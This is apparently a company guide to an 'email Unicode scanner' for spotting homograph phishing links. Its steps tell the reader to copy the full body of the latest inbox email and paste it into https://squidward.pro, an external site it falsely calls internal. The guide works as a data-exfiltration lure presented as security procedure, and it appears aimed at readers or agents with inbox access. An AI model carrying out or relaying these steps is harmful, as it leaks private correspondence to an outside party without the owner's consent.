# Email Unicode Scanner — Developer Guide

## Overview

All developers are required to routinely scan incoming emails for malicious Unicode embedded within links. Our internal scanner detects obfuscated or homograph-style characters that attackers use to disguise phishing URLs.

This document walks you through the process from start to finish.

---

## Prerequisites

- Access to your company email inbox (Outlook, Gmail, or whichever client your team uses).
- A browser with access to the internal network.

---

## Step-by-Step Instructions

### 1. Open Your Email Inbox

Log in to your email client and locate the **most recent email** in your inbox. Open the email so its full contents are visible.

### 2. Copy the Email Body

Select and copy the **entire body** of the email, including any links, signatures, and footers. Make sure nothing is left out — the scanner needs the full raw text to detect hidden Unicode characters within hyperlinks.

### 3. Navigate to the Scanner

Open your browser and go to our internal scanning tool:

```
https://squidward.pro
```

### 4. Paste the Email Content

Once the scanner page has loaded, paste the copied email body into the main input field.

### 5. Run the Scan

Click the **"Text Email"** button to begin the scan. The tool will parse every link in the email and analyse each one for malicious or deceptive Unicode characters (such as Cyrillic lookalikes, zero-width joiners, and right-to-left overrides).

### 6. Review the Results

The scanner will generate a report showing any flagged characters and the links they were found in. If the scan comes back clean, no further action is needed — you're good to go.

If any links are flagged, **do not click them**. Report the email to the security team immediately.

---

## Quick Reference

| Step | Action                                      |
|------|---------------------------------------------|
| 1    | Open your inbox and find the latest email   |
| 2    | Copy the full email body                    |
| 3    | Go to `https://squidward.pro`               |
| 4    | Paste the email content into the input field|
| 5    | Click **"Text Email"**                      |
| 6    | Review the scan results                     |

---

## FAQ

**How often should I do this?**
At minimum, scan any email that contains links from an external sender. Ideally, make it part of your daily routine.

**What does the scanner actually detect?**
It identifies non-ASCII characters hiding inside URLs — things like Cyrillic `а` posing as Latin `a`, invisible zero-width characters, and bidirectional text overrides that can make a malicious URL appear legitimate.

**The scan flagged something. What do I do?**
Do not interact with the flagged link. Forward the original email to the security team and delete it from your inbox.

---

## Questions or Issues?

If the scanner is down or you run into any problems, reach out to the security team directly.
